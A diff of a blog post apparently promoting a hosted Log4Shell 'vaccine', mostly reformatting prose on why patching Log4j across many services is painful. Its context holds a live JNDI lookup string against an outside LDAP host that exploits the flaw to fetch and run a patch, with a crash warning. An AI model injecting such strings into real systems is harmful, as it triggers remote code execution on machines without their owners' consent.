@@ -44,10 +44,21 @@ ${jndi:ldap://patch.log4shell.com:1389/a}
 
 ## Why Log4Shell is an especially painful vulnerability
 
-Mitigating a vulnerability in a single dependency used in one project is often difficult. Code must be written, tests must
-pass, changes must be approved, it has to be deployed, and finally monitored. A vulnerability in a logging framework,
-especially one as prolific as Log4j, is often not a single vulnerability, either. It's often not just a matter of updating
-_your_ code, but also updating any of your dependencies that are _also using Log4j_.
+Mitigating a vulnerability in a single dependency used by your project typically requires a lot of work:
+
+- Code must be written,
+- Tests must pass,
+- Changes must be approved,
+- It has to be deployed,
+- and, finally, it must be monitored.
+
+A vulnerability in a logging framework, especially one as prolific as Log4j, is often not a single vulnerability in a
+single dependency though. Mitigating Log4Shell isn't just a matter of updating _your_ code, but it also requires
+updating all of your dependencies that are _also using_ Log4j.
+
+Now repeat that 50+ times for every service you own. *Welcome to Log4Shell!*
+
+<!--truncate-->
 
 ## Living in Dependency Hell
 
@@ -119,7 +130,8 @@ We run that server, but it's been built due to the work of [many](https://github
 smart [people](https://github.com/corretto/hotpatch-for-apache-log4j2) working on and dealing with the fallout
 from Log4Shell. We've just made it a little easier for you to use by hosting it for you.
 
-:::warn There be dragons!
+:::warning There be dragons!
+
 This string will attempt to exploit the Log4Shell vulnerability and apply a patch to your live system. While this
 patch has been tested on a number of systems, your system might be different and could possibly crash. You have been warned.
 
